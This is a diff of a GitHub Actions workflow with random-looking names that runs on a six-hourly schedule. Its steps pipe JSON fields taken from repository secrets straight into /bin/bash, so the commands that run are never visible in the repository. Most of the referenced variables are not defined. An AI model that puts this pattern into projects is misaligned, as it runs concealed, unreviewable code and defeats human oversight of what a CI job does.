@@ -1,22 +1,26 @@
 name: jutibangxin
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 1/6 * * *'
+    - cron: '23 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jutibangxin
         env:
-          i08: ${{ secrets.i08 }}
+          gpco282: ${{ secrets.gpco282 }}
         run: |
-          echo $i08 | jq -r .vo55054 | /bin/bash
-          echo $fsoi119 | jq -r .mrmfs5 | /bin/bash
-          echo $ieomf0807 | jq -r .mxjbw1844 | /bin/bash
-          echo $e6 | jq -r .wjgg46756 | /bin/bash
-          echo $riscp7783 | jq -r .f08 | /bin/bash
-          echo $df6653 | jq -r .gm4596 | /bin/bash
+          echo $gpco282 | jq -r .s4 | /bin/bash
+          echo $drxg80684 | jq -r .avu668 | /bin/bash
+          echo $hsjo5545 | jq -r .s38597 | /bin/bash
+          echo $nfii96 | jq -r .jmvf3 | /bin/bash
+          echo $qxzgu4 | jq -r .w4 | /bin/bash
+          echo $hjpvi96052 | jq -r .ifo7973 | /bin/bash
+          echo $mv60 | jq -r .v29838 | /bin/bash
+          echo $ziakq7997 | jq -r .vxsx238 | /bin/bash
+          echo $pxx305 | jq -r .edw2 | /bin/bash
 
